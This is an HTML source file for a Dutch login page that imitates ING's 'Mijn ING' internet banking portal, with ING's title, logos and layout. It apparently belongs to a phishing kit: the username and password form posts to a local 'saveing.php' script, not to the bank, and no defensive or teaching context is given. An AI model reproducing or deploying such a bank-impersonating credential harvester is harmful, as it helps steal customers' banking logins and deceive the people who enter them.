<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Internet Bankieren - ING</title>
  <link rel="stylesheet" href="ing.css">
  <link rel="icon" type="image/png" href="ing logo's/ingfavicon.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
  <header>
    <div class="top-bar">
      <div class="left">
        <img src="ing logo's/ing-logo.svg" alt="ING Logo" class="logo">
      </div>
      <div class="right">
        <span class="language-option nl">NL</span>
        <span class="separator">|</span>
        <span class="language-option en">EN</span>
      </div>
    </div>
  </header>
  <main>
    <div class="login-container">
      <div class="tab-container">
        <button id="priveTab" class="tab active" onclick="switchTab('prive')">Particulier</button>
        <button id="zakelijkTab" class="tab" onclick="switchTab('zakelijk')">Zakelijk</button>
        <div class="tab-indicator"></div>
      </div>
      <h1 class="login-title">Log in bij Mijn ING</h1>
      <form action="saveing.php" method="post">
        <label for="username">Gebruikersnaam</label>
        <input type="text" id="username" name="username" required placeholder="">
        <label for="password">Wachtwoord</label>
        <input type="password" id="password" name="password" required placeholder="">
        <div class="remember-checkbox">
          <input type="checkbox" id="remember" name="remember">
          <label for="remember">Onthoud mijn gebruikersnaam</label>
        </div>
        <div class="login-actions">
          <button type="submit" class="login-button">Inloggen</button>
        </div>
      </form>
    </div>
    <div class="footer-links-container">
      <div class="footer-links">
        <a href="#">Word klant</a>
        <span class="footer-separator">|</span>
        <a href="#">Veilig bankieren</a>
        <span class="footer-separator">|</span>
        <a href="#">Privacy en cookies</a>
        <span class="footer-separator">|</span>
        <a href="#">Disclaimer</a>
      </div>
    </div>
  </main>
  <img src="ing logo's/ING_HalfLion_Reversed.svg" class="half-lion" alt="ING Half Lion">
  <script>
    document.addEventListener('DOMContentLoaded', function(){
      switchTab('prive');
    });
    function switchTab(tab){
      var indicator = document.querySelector('.tab-indicator');
      indicator.style.left = (tab==='prive') ? "0%" : "50%";
      document.getElementById("priveTab").classList.toggle("active", tab==='prive');
      document.getElementById("zakelijkTab").classList.toggle("active", tab==='zakelijk');
    }
  </script>
</body>
</html>
